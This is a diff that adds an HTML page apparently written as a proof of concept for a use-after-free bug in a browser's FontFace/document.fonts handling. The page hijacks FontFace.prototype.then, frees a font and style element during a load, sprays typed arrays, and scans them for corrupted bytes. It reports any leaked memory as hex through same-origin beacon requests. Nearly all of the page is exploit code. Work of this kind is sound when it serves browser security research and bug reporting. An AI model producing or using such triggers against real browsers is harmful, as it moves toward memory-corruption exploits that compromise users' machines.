@@ -1,0 +1,43 @@
+<!doctype html><meta charset="utf-8"><title>uaf33</title><body><script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+m+'?t='+Date.now(),false);x.send(null);}catch(e){}}
+function hex8(u,o){var s='';for(var i=0;i<8;i++){s+=('0'+u[o+i].toString(16)).slice(-2)}return s}
+var RC=1, N=64, styleEl=null, fired=false, keep=[];
+function setup(){
+  var A=new FontFace('m0','local(Helvetica)',{unicodeRange:'U+0041'});
+  document.fonts.add(A); void A.loaded;
+  styleEl=document.createElement('style');
+  styleEl.textContent="@font-face { font-family: p0; src: local(Arial); unicode-range: U+0042; }";
+  document.head.appendChild(styleEl);
+  b('U33-SETUP');
+  fired=false;
+  Object.defineProperty(FontFace.prototype,'then',{
+    configurable:true,
+    get:function(){
+      if (fired) return undefined;
+      fired=true;
+      if (styleEl) styleEl.remove();
+      try { document.fonts.delete(this); } catch(e){}
+      document.body.offsetHeight;
+      keep=[];
+      for (var i=0;i<N;i++){ var u=new Uint8Array(160); if (RC) u[0]=RC; keep.push(u); }
+      b('U33-SPRAY-'+N+'-RC-'+RC);
+      try { document.fonts.check('1em p0'); } catch(e){}
+      b('U33-CHECK-RETURNED');
+      for (var i=0;i<keep.length;i++){
+        var u=keep[i];
+        if (u[0]!==RC||u[8]||u[0x50]||u[0x58]||u[0x68]||u[0x90]||u[0x98])
+          b('U33-POST-b'+i+'-0:'+hex8(u,0)+'-8:'+hex8(u,8)+'-50:'+hex8(u,0x50)+'-58:'+hex8(u,0x58)+'-68:'+hex8(u,0x68)+'-90:'+hex8(u,0x90)+'-98:'+hex8(u,0x98));
+      }
+      b('U33-SCAN-DONE');
+      return undefined;
+    },
+    set:function(){}
+  });
+  b('U33-LOAD-CALLED');
+  document.fonts.load('1em m0, p0','AB').then(function(){ b('U33-RESOLVED'); }, function(){ b('U33-REJECTED'); });
+  setTimeout(function(){ b('U33-T400-ALIVE'); },400);
+}
+function run(){ b('U33-PARSE'); setup(); }
+if (document.readyState==='complete'||document.readyState==='interactive') setTimeout(run,0);
+else document.addEventListener('DOMContentLoaded',run);
+</script></body>
